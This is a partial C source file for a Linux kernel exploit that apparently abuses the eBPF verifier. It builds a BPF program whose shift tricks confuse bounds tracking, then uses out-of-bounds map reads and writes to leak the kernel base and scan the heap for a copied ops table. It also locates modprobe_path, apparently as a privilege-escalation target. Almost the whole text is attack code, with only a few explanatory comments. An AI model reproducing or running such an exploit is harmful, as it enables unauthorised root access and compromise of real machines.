...
int load_prog()
{
	struct bpf_insn prog[] = {
		...
		BPF_EXIT_INSN(),
		BPF_JMP_IMM(BPF_JLE, BPF_REG_6, 4, 1),
		BPF_EXIT_INSN(), // here we know REG_6 umin=0 and umax=1
		BPF_ALU64_IMM(BPF_ALSH, BPF_REG_6, 62), // now 64 bit signed bounds is [0, 0] maybe
		BPF_ALU64_IMM(BPF_ARSH, BPF_REG_6, 62), // restore original value lol
		...
		// BPF_ALU64_REG(BPF_MUL, BPF_REG_6, BPF_REG_8),
		...
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x98),
		BPF_MAP_GET_ADDR(0, BPF_REG_7),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_6),
		...
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x660),
		BPF_MAP_GET_ADDR(0, BPF_REG_7),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_6),
		BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),
		BPF_MAP_GET_ADDR(4, BPF_REG_6),
		...
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0xc0),
		BPF_MAP_GET_ADDR(0, BPF_REG_7),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),
		BPF_ST_MEM(BPF_W, BPF_REG_7, 0, 0x17),
		BPF_MOV64_REG(BPF_REG_8, BPF_REG_6),
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0xb4),
		BPF_MAP_GET_ADDR(0, BPF_REG_7),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_6),
		BPF_ST_MEM(BPF_W, BPF_REG_7, 0, -1),
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0xac),
		BPF_MAP_GET_ADDR(0, BPF_REG_7),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),
...
int main()
{
	...
	size_t linux_base = ops_addr - 0xa0dec0;
	...
	// size_t init_pid_ns = linux_base + 0xc2de00;
	// pid_t pid = getpid();
	...
	update_elem(1, 2);
	write_msg();
	size_t orig_leak = get_elem(4) - 0x7f4c00 + 0x7fe000 + 0x802800;
	printf("Orig leak: %llx\n", orig_leak);
	size_t heap_addr = orig_leak;
	size_t copied_ops_addr = orig_leak;
	for (long long i = -0xf00000; i <= 0xf00000; i += 0x1000) {
		heap_addr = orig_leak + i;
		copied_ops_addr = heap_addr + 0x150;

		size_t test_ops = read64(heap_addr);
		if (ops_addr == test_ops) {
			printf("Found!\n");
			break;
		}
	}
	if (read64(heap_addr) != ops_addr) {
		printf("Not found\n");
		return 1;
	}

	size_t modprobe_path = linux_base + 0xc2e800;
	printf("Heap ptr: %llx\n", heap_addr);
	printf("Modprobe path: %llx\n", modprobe_path);
	printf("Copied ops addr path: %llx\n", copied_ops_addr);

	update_elem(0x10+0x50/8, *(size_t*)&ops[0x20]);

	for (int i = 0; i < 0xe8; i+=8) {
		printf("%llx\n", read64(copied_ops_addr + i));
	}

	// for(int i=0;i<0xe8;i+=8)
	// {
	// 	if (*(size_t*)&ops[i] == 0 && i != 10*8) {
	// 		update_elem(0x10+i/8, 0x41 + i/8);
	// 	}
	// }
